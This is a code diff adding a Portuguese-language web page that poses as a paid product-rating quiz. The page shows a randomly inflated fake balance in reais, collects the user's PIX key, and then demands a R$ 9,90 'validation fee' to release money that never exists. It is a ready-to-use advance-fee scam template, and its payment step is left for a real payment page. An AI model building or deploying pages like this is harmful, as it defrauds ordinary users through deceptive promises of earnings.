@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avaliador de Produtos Premium</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            max-width: 600px;
+            width: 100%;
+        }
+
+        .quiz-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .quiz-header h1 {
+            color: #4a5568;
+            font-size: clamp(20px, 5vw, 28px);
+            margin-bottom: 10px;
+        }
+
+        .balance {
+            background: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            font-size: clamp(16px, 4vw, 20px);
+            margin-top: 15px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .question-container, .redeem-container, .fee-container {
+            display: none;
+            text-align: center;
+        }
+
+        .question-container.active, .redeem-container.active, .fee-container.active {
+            display: block;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .product-image {
+            width: 100%;
+            height: clamp(150px, 40vw, 200px);
+            object-fit: cover;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .product-title {
+            font-size: clamp(18px, 4vw, 24px);
+            color: #2d3748;
+            margin-bottom: 15px;
+        }
+
+        .rating {
+            display: flex;
+            justify-content: center;
+            gap: clamp(5px, 2vw, 10px);
+            margin: 20px 0;
+        }
+
+        .star {
+            font-size: clamp(30px, 8vw, 40px);
+            cursor: pointer;
+            color: #cbd5e0;
+            transition: color 0.3s ease;
+            user-select: none;
+        }
+
+        .star:hover, .star.selected {
+            color: #f6e05e;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: #e2e8f0;
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress {
+            height: 100%;
+            background: #4299e1;
+            width: 20%;
+            transition: width 0.3s ease;
+        }
+
+        .redeem-container {
+            text-align: center;
+        }
+
+        .congratulations {
+            font-size: clamp(22px, 5vw, 32px);
+            color: #2d3748;
+            margin-bottom: 20px;
+        }
+
+        .earned-amount {
+            font-size: clamp(28px, 6vw, 40px);
+            color: #48bb78;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        .pix-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 16px;
+            margin: 20px 0;
+            transition: border-color 0.3s ease;
+        }
+
+        .pix-input:focus {
+            outline: none;
+            border-color: #4299e1;
+        }
+
+        .btn {
+            background: #48bb78;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: clamp(14px, 4vw, 18px);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        .fee-container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .fee-amount {
+            font-size: clamp(20px, 5vw, 28px);
+            color: #4a5568;
+            margin: 20px 0;
+        }
+
+        .fee-notice {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: clamp(14px, 3.5vw, 16px);
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+
+            .quiz-header h1 {
+                font-size: 22px;
+            }
+
+            .star {
+                font-size: 35px;
+            }
+
+            .btn {
+                padding: 12px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="quiz-header">
+            <h1>Avaliador de Produtos Premium</h1>
+            <div class="balance">Saldo: R$ <span id="balance">0.00</span></div>
+            <div class="progress-bar">
+                <div class="progress"></div>
+            </div>
+        </div>
+
+        <div class="question-container active" data-question="1">
+            <img src="/api/placeholder/600/300" alt="Smartphone Premium" class="product-image">
+            <h2 class="product-title">Smartphone Ultimate X</h2>
+            <div class="rating" data-value="0">
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+            </div>
+        </div>
+
+        <!-- Produtos 2-5 similares -->
+        <div class="question-container" data-question="2">
+            <img src="/api/placeholder/600/300" alt="Fone de Ouvido Premium" class="product-image">
+            <h2 class="product-title">HeadPhone Pro Max</h2>
+            <div class="rating" data-value="0">
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+            </div>
+        </div>
+
+        <div class="question-container" data-question="3">
+            <img src="/api/placeholder/600/300" alt="Smartwatch Premium" class="product-image">
+            <h2 class="product-title">SmartWatch Elite</h2>
+            <div class="rating" data-value="0">
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+            </div>
+        </div>
+
+        <div class="question-container" data-question="4">
+            <img src="/api/placeholder/600/300" alt="Tablet Premium" class="product-image">
+            <h2 class="product-title">Tablet Pro X</h2>
+            <div class="rating" data-value="0">
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+            </div>
+        </div>
+
+        <div class="question-container" data-question="5">
+            <img src="/api/placeholder/600/300" alt="Notebook Premium" class="product-image">
+            <h2 class="product-title">Notebook Ultra Pro</h2>
+            <div class="rating" data-value="0">
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+                <span class="star">★</span>
+            </div>
+        </div>
+
+        <!-- Tela de Resgate -->
+        <div class="redeem-container" id="redeemContainer">
+            <h2 class="congratulations">Parabéns! 🎉</h2>
+            <p>Você concluiu todas as avaliações!</p>
+            <div class="earned-amount">
+                Saldo disponível: R$ <span id="finalBalance">0.00</span>
+            </div>
+            <p>Digite sua chave PIX para receber:</p>
+            <input type="text" class="pix-input" placeholder="Digite sua chave PIX" required>
+            <button class="btn" onclick="showFeeScreen()">Resgatar Saldo</button>
+        </div>
+
+        <!-- Tela de Taxa -->
+        <div class="fee-container" id="feeContainer">
+            <h2 class="congratulations">Quase lá! 🎯</h2>
+            <div class="fee-notice">
+                Para processar seu pagamento, é necessário pagar uma pequena taxa de validação.
+            </div>
+            <div class="fee-amount">
+                Taxa de processamento: R$ 9,90
+            </div>
+            <p>Após o pagamento, seu saldo será liberado em até 24h.</p>
+            <button class="btn" style="background: #4299e1;" onclick="showPaymentScreen()">Pagar Taxa e Liberar Saldo</button>
+        </div>
+    </div>
+
+    <script>
+        let currentBalance = 0;
+        const balanceDisplay = document.getElementById('balance');
+        const finalBalanceDisplay = document.getElementById('finalBalance');
+        const progressBar = document.querySelector('.progress');
+
+        // Configuração das estrelas
+        document.querySelectorAll('.rating').forEach(rating => {
+            const stars = rating.querySelectorAll('.star');
+            stars.forEach((star, index) => {
+                star.addEventListener('click', () => {
+                    rating.dataset.value = index + 1;
+                    stars.forEach((s, i) => {
+                        s.classList.toggle('selected', i <= index);
+                    });
+                    
+                    setTimeout(() => {
+                        const currentQuestionNum = parseInt(rating.closest('.question-container').dataset.question);
+                        if (currentQuestionNum === 5) {
+                            showRedeemScreen();
+                        } else {
+                            nextQuestion(currentQuestionNum);
+                        }
+                    }, 500);
+                });
+            });
+        });
+
+        function updateBalance(rating) {
+            const baseValue = Math.floor(Math.random() * 50) + 30; // Valores base mais altos
+            const increment = (baseValue * rating) + Math.floor(Math.random() * 40);
+            
+            const steps = 20;
+            const incrementPerStep = increment / steps;
+            let step = 0;
+            
+            const animation = setInterval(() => {
+                if (step < steps) {
+                    currentBalance += incrementPerStep;
+                    balanceDisplay.textContent = currentBalance.toFixed(2);
+                    finalBalanceDisplay.textContent = currentBalance.toFixed(2);
+                    step++;
+                } else {
+                    clearInterval(animation);
+                }
+            }, 50);
+        }
+
+        function nextQuestion(currentQuestionNum) {
+            const currentQuestion = document.querySelector(`[data-question="${currentQuestionNum}"]`);
+            const rating = parseInt(currentQuestion.querySelector('.rating').dataset.value);
+            
+            updateBalance(rating);
+            progressBar.style.width = `${(currentQuestionNum * 20)}%`;
+
+            currentQuestion.classList.remove('active');
+            const nextQuestion = document.querySelector(`[data-question="${currentQuestionNum + 1}"]`);
+            nextQuestion.classList.add('active');
+        }
+
+        function showRedeemScreen() {
+            const lastQuestion = document.querySelector(`[data-question="5"]`);
+            const rating = parseInt(lastQuestion.querySelector('.rating').dataset.value);
+            updateBalance(rating);
+            
+            progressBar.style.width = '100%';
+            document.querySelectorAll('.question-container').forEach(q => q.style.display = 'none');
+            document.getElementById('redeemContainer').classList.add('active');
+        }
+
+        function showFeeScreen() {
+            const pixInput = document.querySelector('.pix-input');
+            if (!pixInput.value) {
+                alert('Por favor, digite sua chave PIX');
+                return;
+            }
+            
+            document.getElementById('redeemContainer').classList.remove('active');
+            document.getElementById('feeContainer').classList.add('active');
+        }
+
+        function showPaymentScreen() {
+            // Aqui você pode redirecionar para uma página de pagamento real
+            alert('Você será redirecionado para a página de pagamento...');
+        }
+    </script>
+</body>
+</html>
